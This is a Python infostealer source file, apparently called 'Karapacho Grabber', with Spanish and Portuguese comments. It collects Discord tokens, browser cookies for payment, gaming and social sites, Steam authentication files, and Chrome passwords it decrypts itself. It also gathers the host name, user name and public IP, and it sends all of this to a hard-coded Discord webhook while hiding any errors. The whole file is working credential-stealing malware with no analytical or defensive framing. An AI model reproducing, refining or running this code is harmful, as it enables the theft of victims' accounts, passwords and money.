import os
import re
import json
import sqlite3
import shutil
import base64
import requests
import socket
import getpass
import platform
import datetime
import time
from urllib.request import urlopen

# ==================== CONFIGURACIÓN ====================
WEBHOOK_URL = "https://discord.com/api/webhooks/1478598139035385897/XYnTf-XPnYwrp1FXH1RPzlw7w1czPn85qGCdZkt1_KTy5ZCjW7FzMEwnganax5wCT_op"
USER = getpass.getuser()
LOCAL_APP_DATA = os.getenv('LOCALAPPDATA')
APP_DATA = os.getenv('APPDATA')
HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

# ==================== FUNÇÕES DE ENVIO (probadas) ====================
def enviar_mensagem(texto):
    """Envia uma mensagem simples ao webhook"""
    try:
        r = requests.post(WEBHOOK_URL, json={"content": texto[:2000]}, headers=HEADERS, timeout=10)
        return r.status_code == 204
    except:
        return False

def enviar_embed(titulo, cor, campos):
    """Envia um embed ao webhook"""
    embed = {
        "title": f"💀 **{titulo}** 💀",
        "color": cor,
        "fields": campos,
        "footer": {"text": "Karapacho Grabber • Modo Terror"},
        "timestamp": datetime.datetime.now().isoformat()
    }
    try:
        requests.post(WEBHOOK_URL, json={"embeds": [embed]}, headers=HEADERS, timeout=10)
    except:
        pass

# ==================== 1. INFORMAÇÕES DO SISTEMA ====================
def get_system_info():
    try:
        ip = urlopen("https://api.ipify.org", timeout=5).read().decode()
    except:
        ip = "No disponible"
    return (
        f"🖥️ **Host:** {socket.gethostname()}\n"
        f"👤 **Usuário:** {USER}\n"
        f"🌐 **IP Pública:** {ip}\n"
        f"💻 **SO:** {platform.platform()}"
    )

# ==================== 2. TOKENS DO DISCORD ====================
def get_discord_tokens():
    tokens = set()
    paths = [
        LOCAL_APP_DATA + r'\Google\Chrome\User Data\Default\Local Storage\leveldb',
        LOCAL_APP_DATA + r'\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb',
        LOCAL_APP_DATA + r'\Microsoft\Edge\User Data\Default\Local Storage\leveldb',
        APP_DATA + r'\discord\Local Storage\leveldb',
        APP_DATA + r'\discordptb\Local Storage\leveldb',
        APP_DATA + r'\discordcanary\Local Storage\leveldb',
    ]
    token_pat = re.compile(r'[a-zA-Z0-9_-]{24,}\.[a-zA-Z0-9_-]{6,}\.[a-zA-Z0-9_-]{27,}')
    mfa_pat = re.compile(r'mfa\.[a-zA-Z0-9_-]{84,}')
    
    for path in paths:
        if os.path.exists(path):
            for file in os.listdir(path):
                if file.endswith(('.ldb', '.log')):
                    try:
                        with open(os.path.join(path, file), 'r', errors='ignore') as f:
                            content = f.read()
                            tokens.update(token_pat.findall(content))
                            tokens.update(mfa_pat.findall(content))
                    except:
                        continue
    return list(tokens)

# ==================== 3. COOKIES DE SERVIÇOS (com tratamento de erro) ====================
def get_cookies():
    cookies = []
    browser_paths = [
        (LOCAL_APP_DATA + r'\Google\Chrome\User Data', 'Chrome'),
        (LOCAL_APP_DATA + r'\Microsoft\Edge\User Data', 'Edge'),
        (LOCAL_APP_DATA + r'\BraveSoftware\Brave-Browser\User Data', 'Brave'),
    ]
    target_domains = ['paypal', 'steam', 'epicgames', 'instagram', 'facebook']
    
    for base, browser_name in browser_paths:
        cookie_db = os.path.join(base, 'Default', 'Network', 'Cookies')
        if not os.path.exists(cookie_db):
            cookie_db = os.path.join(base, 'Default', 'Cookies')
        
        if os.path.exists(cookie_db):
            # Tentar copiar o arquivo, se falhar, ignorar
            try:
                shutil.copy2(cookie_db, 'temp_cookies.db')
            except Exception as e:
                # Arquivo em uso, não conseguimos copiar
                continue
            
            conn = None
            try:
                conn = sqlite3.connect('temp_cookies.db')
                cursor = conn.cursor()
                cursor.execute('SELECT host_key, name, value FROM cookies')
                for host, name, value in cursor.fetchall():
                    if any(domain in host for domain in target_domains):
                        cookies.append(f"**{browser_name}** | {host}\n└─ {name}: `{value[:50]}{'...' if len(value)>50 else ''}`")
            except Exception as e:
                # Erro ao ler o banco, ignorar
                pass
            finally:
                if conn:
                    conn.close()
                # Remover o arquivo temporário se existir
                try:
                    os.remove('temp_cookies.db')
                except:
                    pass
    return cookies

# ==================== 4. ARQUIVOS DO STEAM ====================
def get_steam_files():
    steam_paths = [
        os.path.join(os.getenv('PROGRAMFILES(x86)'), 'Steam'),
        os.path.join(os.getenv('PROGRAMFILES'), 'Steam'),
    ]
    found = []
    for sp in steam_paths:
        if os.path.exists(sp):
            try:
                for file in os.listdir(sp):
                    if file.startswith('ssfn') or file == 'config.vdf':
                        found.append(f"📁 `{file}`")
            except:
                continue
    return found

# ==================== 5. SENHAS DO CHROME (com tratamento de erro) ====================
def get_chrome_passwords():
    """Tenta obter senhas, mas se falhar, retorna lista vazia"""
    try:
        import win32crypt
        from Crypto.Cipher import AES
    except ImportError:
        return []  # Se as bibliotecas não estiverem instaladas, não tentamos
    
    # Caminhos
    local_state_path = os.path.join(LOCAL_APP_DATA, 'Google', 'Chrome', 'User Data', 'Local State')
    if not os.path.exists(local_state_path):
        return []
    
    # Ler chave mestra
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return []
    
    login_db = os.path.join(LOCAL_APP_DATA, 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
    if not os.path.exists(login_db):
        return []
    
    # Copiar o banco de dados
    try:
        shutil.copy2(login_db, 'temp_login.db')
    except:
        return []  # Arquivo em uso, não conseguimos
    
    passwords = []
    conn = None
    try:
        conn = sqlite3.connect('temp_login.db')
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        for url, user, enc_pass in cursor.fetchall():
            if user and enc_pass:
                try:
                    iv = enc_pass[3:15]
                    payload = enc_pass[15:]
                    cipher = AES.new(key, AES.MODE_GCM, iv)
                    decrypted = cipher.decrypt(payload)[:-16].decode('utf-8')
                    passwords.append(f"🔗 {url}\n   👤 `{user}`\n   🔑 `{decrypted}`")
                except:
                    continue
    except Exception as e:
        pass
    finally:
        if conn:
            conn.close()
        try:
            os.remove('temp_login.db')
        except:
            pass
    return passwords

# ==================== 6. FUNÇÃO PRINCIPAL ====================
def main():
    # Mensagem de início (sabemos que funciona)
    enviar_mensagem("💀 **Karapacho Grabber iniciado** 💀")
    
    # Coletar dados
    sys_info = get_system_info()
    discord_tokens = get_discord_tokens()
    cookies = get_cookies()
    steam_files = get_steam_files()
    passwords = get_chrome_passwords()
    
    # Construir campos do embed
    campos = []
    
    # Sistema
    campos.append({"name": "🕷️ **SISTEMA**", "value": sys_info[:1024], "inline": False})
    
    # Tokens Discord
    if discord_tokens:
        token_text = "\n".join(discord_tokens[:5])
        if len(discord_tokens) > 5:
            token_text += f"\n... e {len(discord_tokens)-5} mais"
        campos.append({"name": "🔮 **TOKENS DISCORD**", "value": token_text[:1024], "inline": False})
    else:
        campos.append({"name": "🔮 **TOKENS DISCORD**", "value": "Nenhum encontrado (abra o Discord primeiro) 💔", "inline": False})
    
    # Cookies
    if cookies:
        cookie_text = "\n".join(cookies[:5])
        if len(cookies) > 5:
            cookie_text += f"\n... e {len(cookies)-5} mais"
        campos.append({"name": "🍪 **COOKIES DE SERVIÇOS**", "value": cookie_text[:1024], "inline": False})
    else:
        campos.append({"name": "🍪 **COOKIES DE SERVIÇOS**", "value": "Nenhuma encontrada (precisa de sessões abertas) 😈", "inline": False})
    
    # Arquivos Steam
    if steam_files:
        campos.append({"name": "🎮 **ARQUIVOS STEAM**", "value": "\n".join(steam_files[:5])[:1024], "inline": False})
    else:
        campos.append({"name": "🎮 **ARQUIVOS STEAM**", "value": "Nenhum encontrado", "inline": False})
    
    # Senhas
    if passwords:
        pass_text = "\n".join(passwords[:3])
        if len(passwords) > 3:
            pass_text += f"\n... e {len(passwords)-3} mais"
        campos.append({"name": "🔑 **SENHAS SALVAS**", "value": pass_text[:1024], "inline": False})
    else:
        campos.append({"name": "🔑 **SENHAS SALVAS**", "value": "Nenhuma encontrada 🔒", "inline": False})
    
    # Enviar embed
    enviar_embed("KARAPACHO GRABBER", 0x4a0e4e, campos)
    
    # Mensagem final
    enviar_mensagem("✅ **Coleta concluída**")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        # Em caso de erro inesperado, apenas log silencioso (não enviar nada)
        pass